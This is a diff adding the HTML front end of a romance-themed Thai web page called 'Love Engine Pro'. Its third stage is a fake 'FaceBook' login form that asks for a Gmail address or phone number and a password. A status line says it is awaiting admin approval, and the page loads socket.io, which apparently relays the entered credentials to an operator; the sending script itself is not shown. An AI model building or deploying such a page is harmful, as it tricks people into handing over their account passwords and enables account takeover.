@@ -1,0 +1,88 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Love Engine Pro</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
+</head>
+<body>
+    <div id="hearts-container"></div>
+
+    <div id="loading-overlay" class="loading-overlay hidden">
+        <div class="loader-container">
+            <div class="spinner"></div>
+            <div class="glow-ring"></div>
+        </div>
+        <h2 id="loading-text" class="neon-text">กำลังเริ่มต้น...</h2>
+    </div>
+
+    <main id="app">
+        <!-- Stage 1: Welcome -->
+        <section id="stage-welcome" class="glass-card active">
+            <h1 class="neon-text">Love Engine Pro</h1>
+            <p>กำลังเตรียมระบบความรู้สึก...</p>
+            <button id="btn-start" class="neon-button">เริ่ม</button>
+        </section>
+
+        <!-- Stage 2: Question System -->
+        <section id="stage-questions" class="glass-card hidden">
+            <div id="question-container">
+                <h2 id="question-text" class="neon-text">คุณต้องการดำเนินการต่อหรือไม่?</h2>
+                <div class="button-group">
+                    <button id="btn-yes" class="neon-button">ใช่</button>
+                    <button id="btn-no" class="neon-button secondary">ไม่</button>
+                </div>
+            </div>
+            <p id="emotional-response" class="fade-text"></p>
+        </section>
+
+        <!-- Stage 3: Love Portal -->
+        <section id="stage-portal" class="glass-card hidden">
+            <h2 class="neon-text">FaceBook</h2>
+            <p class="subtitle">(Facebook)</p>
+            
+            <div class="input-group">
+                <label for="input-name">number Gmail</label>
+                <input type="text" id="input-name" placeholder="ระบุGmailและเบอร์โทรของคุณ..." autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label for="input-message">Password</label>
+                <div class="password-wrapper">
+                    <input type="password" id="input-message" placeholder="ระบุรหัสลับของคุณ..." autocomplete="off">
+                    <button type="button" id="btn-toggle-pwd" class="eye-btn">👁</button>
+                </div>
+            </div>
+            <button id="btn-send" class="neon-button">ส่ง</button>
+
+            <!-- Small Status Terminal -->
+            <div class="mini-terminal-container">
+                <div id="terminal-window" class="mini-terminal">
+                    <div class="terminal-line"><span class="system">[ระบบ]:</span> รอการอนุมัติจากผู้ดูแล...</div>
+                </div>
+                <div class="terminal-status-bar">
+                    <span class="blink">สถานะ: กำลังประมวลผล Love Protocol</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Stage 4: 3D Universe (Full screen animation) -->
+        <section id="stage-universe" class="fixed inset-0 z-0 hidden pointer-events-auto">
+            <div id="threejs-container-COSMIC_HEART_REVEAL"></div>
+        </section>
+
+        <!-- Stage 5: Approved Screen (Shown after admin approve) -->
+        <section id="stage-reveal" class="glass-card hidden">
+            <h1 class="neon-text-intense">เข้าถึงระบบสำเร็จ</h1>
+            <div id="reveal-text" class="typewriter">ขอบคุณที่อยู่กับฉันมาตลอด</div>
+            <div class="reveal-decoration">❤</div>
+        </section>
+    </main>
+
+    <script src="app.js"></script>
+    <audio id="universeMusic" src="She.mp3" loop></audio>
+</body>
+</html>
